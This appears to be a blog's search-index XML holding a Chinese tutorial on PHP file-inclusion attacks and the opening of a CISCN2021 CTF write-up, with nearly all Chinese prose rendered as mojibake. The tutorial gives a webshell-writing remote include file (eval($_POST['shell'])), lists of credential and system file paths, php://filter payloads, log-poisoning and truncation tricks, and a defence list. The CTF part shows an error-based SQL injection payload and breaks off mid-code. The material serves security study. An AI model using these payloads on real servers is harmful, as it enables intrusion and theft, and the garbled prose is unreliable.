<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ </title>
      <link href="posts/38386.html"/>
      <url>posts/38386.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p><strong>ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ</strong></p><p>å°†éœ€è¦é‡å¤è°ƒç”¨çš„å‡½æ•°å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹è¯¥æ–‡ä»¶è¿›è¡ŒåŒ…å«æ—¶äº§ç”Ÿçš„æ“ä½œã€‚</p><p><strong>æ¼æ´äº§ç”ŸåŸå› </strong></p><p>æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–ä¸¥æ ¼å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œéé¢„æœŸä»£ç ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œæ”¹å˜URLä¸­filenameçš„å€¼å³å¯æ”¹å˜ä»£ç ä¸­åŒ…å«çš„æ–‡ä»¶ã€‚</p><p><strong>PHPä¸­çš„æ–‡ä»¶åŒ…å«å‡½æ•°</strong></p><ul><li><code>include</code> å‡½æ•°å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šæŠ›å‡ºè­¦å‘Šï¼Œä½†ç¨‹åºä»ç»§ç»­æ‰§è¡Œã€‚</li><li><code>include_once</code> åŒ include ï¼Œä½†ä»…åŒ…å«ä¸€æ¬¡ï¼ˆé¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ï¼‰ã€‚</li><li><code>require</code> å‡½æ•°å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºæ‰§è¡Œã€‚</li><li><code>require_once</code> åŒ require ï¼Œä½†ä»…åŒ…å«ä¸€æ¬¡ã€‚</li></ul><h1 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h1><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><p>è¢«åŒ…å«çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨æœ¬åœ°</p><p><strong>åŒ…å«æœ¬åœ°æ•æ„Ÿæ–‡ä»¶</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527204155548.png" alt="image-20210527204155548"></p><p>æ•æ„Ÿæ–‡ä»¶é»˜è®¤è·¯å¾„åˆ—ä¸¾ï¼ˆä»¥ä¸‹ç›®å½•éšç³»ç»Ÿç‰ˆæœ¬ä¸åŒè€Œæœ‰å·®å¼‚ï¼‰ï¼š</p><ul><li><p>windowsç³»ç»Ÿ:</p><p>C:\windows\win.ini            //åŸºæœ¬ç³»ç»Ÿé…ç½®æ–‡ä»¶</p><p>C:\boot.ini                      //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p><p>C:\windows\system32\inetsrv\MetaBase.xml                     //iisé…ç½®æ–‡ä»¶</p><p>C:\windows\repair\same                        //å­˜å‚¨windowsç³»ç»Ÿåˆæ¬¡å®‰è£…å¯†ç </p><p>C:\ProgramFiles\mysql\my.ini                        //mysqlé…ç½®ä¿¡æ¯</p><p>C:\ProgramFiles\mysql\data\mysql\user.MYD                    //mysql rootå¯†ç </p><p>C:\windows\php.ini                             //phpé…ç½®ä¿¡æ¯</p></li><li><p>linux/unixç³»ç»Ÿ:</p><p>/etc/passwd                                   //è´¦æˆ·ä¿¡æ¯<br>/etc/shadow                                  //è´¦æˆ·å¯†ç æ–‡ä»¶<br>/usr/local/app/apache2/conf/httpd.conf                    //Apache2é»˜è®¤é…ç½®æ–‡ä»¶<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf                     //è™šæ‹Ÿç½‘ç«™é…ç½®<br>/usr/local/app/php5/lib/php.ini                             //phpç›¸å…³é…ç½®<br>/etc/httpd/conf/httpd.conf                          //apacheé…ç½®ä¿¡æ¯<br>/etc/my.conf                               //mysqlé…ç½®æ–‡ä»¶</p></li></ul><p><strong>åŒ…å«ä¸Šä¼ æ–‡ä»¶</strong></p><blockquote><p>åŒ…å«æ–‡ä»¶çš„å†…å®¹åªè¦ç¬¦åˆphpè¯­æ³•éƒ½èƒ½è¢«å½“æˆphpä»£ç è¿›è¡Œæ‰§è¡Œï¼Œæ— å…³åç¼€åæ˜¯ä»€ä¹ˆã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527203723802.png" alt="image-20210527203723802"></p><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p>è¢«åŒ…å«çš„æ–‡ä»¶åœ¨è¿œç¨‹æœåŠ¡ç«¯</p><blockquote><p>æ¡ä»¶ï¼šphp.iniä¸­è®¾ç½®allow_url_fopen = On(é»˜è®¤)ã€allow_url_include = On ( php5.2åé»˜è®¤ä¸ºoff )</p></blockquote><p><strong>åŒ…å«è¿œç¨‹æ–‡ä»¶</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527210839912.png" alt="image-20210527210839912"></p><p><strong>åŒ…å«è¿œç¨‹shell</strong></p><p>remoteshell.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;can&#x27;t open the file!&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$payload</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527214700058.png" alt="image-20210527214700058"></p><p>åŒ…å«æ„é€ å¥½çš„æ–‡ä»¶åï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºtest.phpï¼Œå³å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œåç»­ä¹Ÿå¯ç”¨èœåˆ€è¿›è¡Œè¿æ¥</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215840715.png" alt="image-20210527215840715"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215247349.png" alt="image-20210527215247349"></p><h1 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h1><h2 id="åˆ©ç”¨PHPä¼ªåè®®"><a href="#åˆ©ç”¨PHPä¼ªåè®®" class="headerlink" title="åˆ©ç”¨PHPä¼ªåè®®"></a>åˆ©ç”¨PHPä¼ªåè®®</h2><p>ä½•ä¸ºä¼ªåè®®ï¼Ÿç®€å•çš„è¯´ï¼Œå°±æ˜¯è‡ªå·±å®šä¹‰çš„åè®®ï¼Œä¹Ÿåªæœ‰è‡ªå·±çš„è½¯ä»¶æ”¯æŒï¼Œå…¶ä»–è½¯ä»¶éƒ½ä¸è¯†åˆ«çš„åè®®å°±æ˜¯ä¼ªåè®®ã€‚</p><p>åœ¨PHPä¸­ï¼ŒPHPç»™è‡ªå·±å®šä¹‰äº†ä¸€ä¸ªphpä¼ªåè®®ï¼Œä»¥ï¼š<code>php://</code>èµ·å¤´ã€‚</p><p>è‡³äº<code>http://</code>ã€<code>file://</code>è¿™äº›éƒ½ä¸æ˜¯ä¼ªåè®®ï¼Œéƒ½æ˜¯å¤§éƒ¨åˆ†ç³»ç»Ÿ/è½¯ä»¶éƒ½æ”¯æŒçš„åè®®ï¼Œå…±äº«åŒä¸€å¥—åè®®æ ‡å‡†ã€‚</p><p><strong>php://filter</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201001030030448.webp" alt="php://filterå‚æ•°"></p><p>phpä¼ªåè®®çš„è¿‡æ»¤å™¨åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡æ‹¼æ¥å„ç§è¿‡æ»¤å™¨è¾¾åˆ°å¿«é€Ÿè½¬æ¢å­—èŠ‚æµçš„æ•ˆæœã€‚å¦‚ï¼š</p><blockquote><p>php://filter/read=convert.base64-encode/resource=index.php</p><p>å…¶ä¸­<code>filter/[read|write]=[è¿‡æ»¤å™¨]</code>å¯ç®€å†™ä¸º<code>filter/[è¿‡æ»¤å™¨]</code>ï¼Œphpä¼šè‡ªé€‰åˆ¤æ–­æ˜¯readè¿˜æ˜¯writeã€‚</p></blockquote><p>æ­¤æ—¶phpä¼šè¯»å–index.phpæ–‡ä»¶çš„å†…å®¹ï¼Œé€šè¿‡convertè¿‡æ»¤å™¨çš„base64-encodeæ–¹æ³•ï¼Œæœ€æ€»å°†æ‰€å¾—ç»“æœä»¥phpä»£ç çš„å½¢å¼åŒ…å«åˆ°è¿è¡Œçš„phpæ–‡ä»¶ä¹‹ä¸­ï¼Œç”±äºbase64ç¼–ç ä¹‹åçš„å†…å®¹ä¸ä¼šå‡ºç°<code>&lt;?</code>ï¼Œæ‰€ä»¥å¿…ç„¶ä¸ä¼šè¢«è¯†åˆ«ä¸ºphpä»£ç ï¼Œæ•…è€Œèƒ½èµ·åˆ°æ–‡ä»¶è¯»å–çš„ä½œç”¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233338272.png" alt="image-20210527233338272"></p><p>å¯¹å…¶è¿›è¡Œbase64è§£ç å¾—åˆ°æºç </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233513514.png" alt="image-20210527233513514"></p><p>å¸¸ç”¨çš„è¿‡æ»¤å™¨æœ‰ï¼š</p><table><thead><tr><th align="left">è¿‡æ»¤å™¨åç§°</th><th align="left">è¯´æ˜</th><th align="left">ç±»åˆ«</th><th align="center">ç‰ˆæœ¬</th></tr></thead><tbody><tr><td align="left">string.rot13</td><td align="left">rot13è½¬æ¢</td><td align="left">å­—ç¬¦ä¸²è¿‡æ»¤å™¨</td><td align="center">PHP&gt;4.3.0</td></tr><tr><td align="left">string.toupperã€string.tolower</td><td align="left">å¤§å°å†™äº’è½¬</td><td align="left">å­—ç¬¦ä¸²è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">string.strip_tags</td><td align="left">å»é™¤<code>&lt;?(.*?)?&gt;</code>çš„å†…å®¹</td><td align="left">string.strip_tags</td><td align="center">PHP&lt;7.3.0</td></tr><tr><td align="left">convert.base64-encodeã€convert.base64-decode</td><td align="left">base64ç¼–ç è½¬æ¢</td><td align="left">è½¬æ¢è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">convert.quoted-printable-encodeã€convert.quoted-printable-decode</td><td align="left">URLç¼–ç è½¬æ¢</td><td align="left">è½¬æ¢è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">convert.iconv.ç¼–ç 1.ç¼–ç 2</td><td align="left">ä»»æ„ç¼–ç è½¬æ¢</td><td align="left">è½¬æ¢è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">zlib.deflateã€zlib.inflate</td><td align="left">zlibå‹ç¼©</td><td align="left">å‹ç¼©è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.1.0</td></tr><tr><td align="left">bzip2.compressã€bzip2.decompress</td><td align="left">zlibå‹ç¼©</td><td align="left">å‹ç¼©è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.1.0</td></tr></tbody></table><p><strong>åˆ©ç”¨ php://input åè®®</strong></p><p>ä¸»è¦ç”¨æ¥æ¥æ”¶postæ•°æ®ï¼Œå°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºphpä»£ç æ‰§è¡Œã€‚</p><p>æ¡ä»¶ï¼š<code>allow_url_include = On</code>(PHPç‰ˆæœ¬&gt;5.2åï¼Œé»˜è®¤å€¼ä¸ºOff)</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527235351691.png" alt="image-20210527235351691"></p><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p>æ‘˜è‡ªï¼š<a href="https://xz.aliyun.com/t/8163#toc-15">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$contentåœ¨å¼€å¤´å¢åŠ äº†exitè¿‡ç¨‹ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥å†…å®¹ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼Œè¿™æ—¶å€™å¦‚ä½•ç»•è¿‡ï¼Ÿ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529174557298.png" alt="image-20210529174557298"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;phpinfo.php&amp;content&#x3D;aPD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>å¯¹å†™å…¥å†…å®¹ï¼ˆè¿™é‡Œæ˜¯<code>&lt;?php phpinfo(); ?&gt;</code>ï¼‰è¿›è¡ŒBase64ç¼–ç ï¼ˆ<code>PD9waHAgcGhwaW5mbygpOyA/Pg==</code>ï¼‰ï¼Œåœ¨åŒ…å«phpinfo.phpè¿™ä¸ªæ–‡ä»¶æ—¶åˆè¿›è¡ŒBase64è§£ç ï¼Œè¿™æ—¶å†™å…¥å†…å®¹è¿˜åŸï¼Œè€Œæ­»äº¡ä»£ç exit()è¢«è§£ç ä¸ºä¹±ç ï¼Œè¾¾åˆ°ç»•è¿‡ç›®çš„ã€‚</p><p>æ·»åŠ é¢å¤–å­—ç¬¦aï¼šBase64è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œå‰é¢çš„<code>phpexit</code>ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œå¢åŠ ä¸€ä¸ªaå‡‘æˆ8ä¸ªå­—ç¬¦ï¼Œè¿™æ ·<code>phpexita</code> è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬å†™å…¥çš„å†…å®¹ä¹Ÿæ‰ä¼šæ­£å¸¸è§£ç ã€‚</p><blockquote><p>base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦(å¤§å°å†™å­—æ¯ï¼Œ0-9ï¼Œ+ï¼Œ/)ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529180216634.png" alt="image-20210529180216634"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529180259106.png" alt="image-20210529180259106"></p><h2 id="å…¶ä»–åè®®"><a href="#å…¶ä»–åè®®" class="headerlink" title="å…¶ä»–åè®®"></a>å…¶ä»–åè®®</h2><p>é™¤äº†phpä¼ªåè®®å¤–ï¼ŒPHPè¿˜æ”¯æŒåŒ…å«ä»¥ä¸‹åè®®çš„æ•°æ®æµï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http:&#x2F;&#x2F; â€” è®¿é—® HTTP(s) ç½‘å€</span><br><span class="line">ftp:&#x2F;&#x2F; â€” è®¿é—® FTP(s) URLs</span><br><span class="line">zlib:&#x2F;&#x2F; â€” å‹ç¼©æµ</span><br><span class="line">data:&#x2F;&#x2F; â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span><br><span class="line">glob:&#x2F;&#x2F; â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">phar:&#x2F;&#x2F; â€” PHP å½’æ¡£</span><br><span class="line">ssh2:&#x2F;&#x2F; â€” Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; â€” RAR</span><br><span class="line">ogg:&#x2F;&#x2F; â€” éŸ³é¢‘æµ</span><br><span class="line">expect:&#x2F;&#x2F; â€” å¤„ç†äº¤äº’å¼çš„æµ</span><br></pre></td></tr></table></figure><p>å¦‚åˆ©ç”¨fileåè®®ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527232103966.png" alt="image-20210527232103966"></p><h2 id="é…åˆæ—¥å¿—æ–‡ä»¶"><a href="#é…åˆæ—¥å¿—æ–‡ä»¶" class="headerlink" title="é…åˆæ—¥å¿—æ–‡ä»¶"></a>é…åˆæ—¥å¿—æ–‡ä»¶</h2><p>å¦‚æœçŸ¥é“æœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ï¼Œå¯åœ¨URLè¯·æ±‚ä¸­æ·»åŠ æ”»å‡»ä»£ç ï¼Œæ­¤ä»£ç ä¼šè¢«è®°å½•åœ¨æœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶å†…ï¼Œå†å¯¹æ—¥å¿—æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œæ”»å‡»ä»£ç ä¾¿ä¼šè¢«æ‰§è¡Œã€‚ï¼ˆå‰ææœ‰è®¿é—®æƒé™ï¼‰</p><p>æµ‹è¯•é¶åœºï¼šDVWA</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527230821426.png" alt="image-20210527230821426"></p><p>åœ¨æ—¥å¿—æ–‡ä»¶ä¸­å¯è§ï¼Œéƒ¨åˆ†å­—ç¬¦è¢«URLç¼–ç ï¼Œä»£ç æ— æ³•æ‰§è¡Œï¼Œå¯ç”¨burpsuiteæŠ“åŒ…æ”¹å›ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231123446.png" alt="image-20210527231123446"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231156043.png" alt="image-20210527231156043"></p><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ­¤æ—¥å¿—æ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œæ’å…¥ä»£ç </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231313524.png" alt="image-20210527231313524"></p><h1 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h1><ul><li>%00æˆªæ–­</li></ul><p>æ¡ä»¶ï¼šmagic_quotes_gps=off      phpç‰ˆæœ¬&lt;5.3.4</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹åç¼€åè¿›è¡Œäº†é™åˆ¶ï¼Œå¯æ˜¯æˆ‘ä»¬æ— æ³•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæ»¡è¶³æ¡ä»¶ä¸‹å¯ç”¨00æˆªæ–­ç»•è¿‡ã€‚</p><p>?page=../../../../phpinfo.php%00</p><ul><li>é•¿åº¦æˆªæ–­</li></ul><p>å‰æï¼šPHPç‰ˆæœ¬&lt;5.2.10</p><p>æ“ä½œç³»ç»Ÿå¯¹äºç›®å½•å­—ç¬¦ä¸²å­˜åœ¨é•¿åº¦é™åˆ¶ï¼Œåœ¨linuxä¸‹4096å­—èŠ‚æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œåœ¨windowä¸‹æ˜¯256å­—èŠ‚ã€‚åªè¦ä¸æ–­çš„é‡å¤<code>./</code>å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lfi.php?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;[.&#x2F;]+&#x2F;.&#x2F;shell.txt</span><br><span class="line">lfi.php?file&#x3D;.&#x2F;shell.txt&#x2F;.[...]+. # ä»…Windowsä¸‹æœ‰æ•ˆ</span><br></pre></td></tr></table></figure><ul><li>é‡å†™</li></ul><p>?page=â€¦.//â€¦.//â€¦.//phpinfo.php</p><ul><li>åˆ©ç”¨phpä¼ªåè®®ç­‰</li></ul><h1 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h1><p>æœ€ç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«webshellå†…å®¹çš„å›¾ç‰‡ï¼Œç„¶åé€šè¿‡åŒ…å«æ­¤å›¾ç‰‡å³å¯å¾—åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶çš„webshellã€‚</p><ul><li>è·å–æ•æ„Ÿä¿¡æ¯</li><li>æ‰§è¡Œä»»æ„å‘½ä»¤</li><li>è·å–æœåŠ¡å™¨æƒé™</li></ul><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><ol><li>å°½é‡ä¸ä½¿ç”¨åŠ¨æ€åŒ…å«ï¼Œæ— éœ€æƒ…å†µä¸‹è®¾ç½®allow_url_includeå’Œallow_url_fopenä¸ºå…³é—­;</li><li>å¯¹å¯ä»¥åŒ…å«çš„æ–‡ä»¶è¿›è¡Œé™åˆ¶ï¸°ä½¿ç”¨ç™½åå•çš„æ–¹å¼ï¼Œæˆ–è€…è®¾ç½®åŒ…å«çš„ç›®å½•ï¼Œopen_basedir ;</li><li>ä¸¥æ ¼æ£€æŸ¥ç”¨æˆ·è¾“å…¥ï¼Œå‚æ•°ä¸­ä¸å…è®¸å‡ºç°../ä¹‹ç±»çš„ç›®å½•è·³è½¬ç¬¦;</li><li>ä¸¥æ ¼æ£€æŸ¥å˜é‡æ˜¯å¦åˆå§‹åŒ–;</li><li>ä¸è¦ä»…ä»…åœ¨å®¢æˆ·ç«¯åšæ•°æ®çš„éªŒè¯ä¸è¿‡æ»¤ï¼Œå…³é”®çš„è¿‡æ»¤æ­¥éª¤åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚</li></ol><p>å‚è€ƒèµ„æ–™ï¼š</p><p>[1] <a href="https://www.0x002.com/2020/PHP%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(LFI)%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)æ¼æ´å­¦ä¹ ç¬”è®°</a></p><p>[2] <a href="https://xz.aliyun.com/t/8163#toc-15">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»CISCN2021åˆèµ›ä¹ å¾—</title>
      <link href="posts/59734.html"/>
      <url>posts/59734.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>è¿™é‡Œç®€è¦è®°å½•ä¸‹æˆ‘çš„æ€è·¯ä»¥åŠå­¦åˆ°çš„å§¿åŠ¿ã€‚</p><p>ä¸€å¼€å§‹ç»è¿‡å‡ æ¬¡å°è¯•å‘ç°unameå¤„å­˜åœ¨æ³¨å…¥ç‚¹ä¸”ä¸ºå•å¼•å·æ‹¬å·é—­åˆï¼Œåœ¨sqlè¯­å¥ä¸ºçœŸæ—¶ï¼Œè¿”å› login ,ä¸ºå‡æ—¶ç©ºç™½ï¼Œäºæ˜¯å°±å‚»ä¹ä¹è®¤ä¸ºæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œè€Œå¿½ç•¥äº†åŠ å¼•å·æ—¶é¡µé¢ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ã€‚æ‰€ä»¥å¯ä»¥ç”¨æ›´ä¸ºç®€å•çš„æŠ¥é”™æ³¨å…¥çš„é¢˜ï¼Œè€Œæˆ‘å´ç”¨å¸ƒå°”ç›²æ³¨æ£é¼“äº†åŠå¤©ã€‚å¾—åˆ°åº“ååï¼Œå‘ç°informationè¢«è¿‡æ»¤ï¼Œæ— æ³•æŸ¥è¡¨å’Œåˆ—åã€‚è‰°éš¾ç»•è¿‡åï¼Œåˆ©ç”¨æ— åˆ—åæ³¨å…¥ï¼Œmysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒæŠŠflagç»™è¯•äº†å‡ºæ¥ï¼Œä½†å¯èƒ½å› ä¸ºå¤§å°å†™çš„åŸå› å¯¼è‡´æäº¤é”™è¯¯ï¼Œç™½å¹²ä¸€åœºï¼ˆåæ¥æ‰çŸ¥é“mysqlå­—ç¬¦ä¸²æ¯”è¾ƒä¸åŒºåˆ†å¤§å°å†™ğŸ˜‚ï¼‰è§£å†³æ–¹æ³•è§ä¸‹æ–‡ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210515183010308.png" alt="image-20210515183010308"></p><p>æ­£è§£æŠ¥é”™æ³¨å…¥</p><p>æš´åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||extractvalue(1,concat(&#39;~&#39;,database()))%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨sqlmapè·å–è¡¨å</p><figure class="highlight 